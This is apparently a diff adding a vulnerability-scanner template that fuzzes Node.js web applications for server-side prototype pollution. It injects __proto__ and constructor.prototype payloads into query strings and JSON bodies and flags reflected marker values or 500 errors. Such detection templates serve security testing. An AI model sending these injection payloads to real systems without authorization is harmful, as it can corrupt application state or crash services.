@@ -1,0 +1,56 @@
+id: server-side-prototype-pollution
+
+info:
+  name: Server-Side Prototype Pollution via Query String / JSON Body
+  author: bugscanner
+  severity: high
+  description: |
+    Injects __proto__ and constructor.prototype payloads into query string
+    parameters and JSON request bodies to detect server-side prototype
+    pollution in Node.js applications. A finding is reported when the injected
+    test value is reflected in the response (confirming the prototype was
+    polluted and read back), or when the server returns a 500 error indicating
+    the pollution caused unexpected behavior.
+  reference:
+    - https://portswigger.net/research/server-side-prototype-pollution
+    - https://github.com/BlackFan/client-side-prototype-pollution
+  tags: custom,prototype-pollution,nodejs,injection,fuzz
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET" || method == "POST"'
+
+    fuzzing:
+      # Query string: append __proto__ and constructor.prototype poison keys
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "&__proto__[pp_polluted]=bugscanner_pp_test"
+          - "&constructor[prototype][pp_polluted]=bugscanner_pp_test"
+          - "&__proto__.pp_polluted=bugscanner_pp_test"
+
+      # JSON body: inject __proto__ as a top-level key alongside existing body
+      - part: body
+        type: postfix
+        mode: single
+        fuzz:
+          - ',"__proto__":{"pp_polluted":"bugscanner_pp_test"}'
+          - ',"constructor":{"prototype":{"pp_polluted":"bugscanner_pp_test"}}'
+
+    matchers-condition: or
+    matchers:
+      # Reflected: the polluted value appeared somewhere in the response
+      - type: word
+        part: body
+        words:
+          - "bugscanner_pp_test"
+        name: prototype-pollution-value-reflected
+
+      # Server error: pollution caused an unexpected runtime error
+      - type: status
+        status:
+          - 500
+        name: server-error-on-prototype-injection
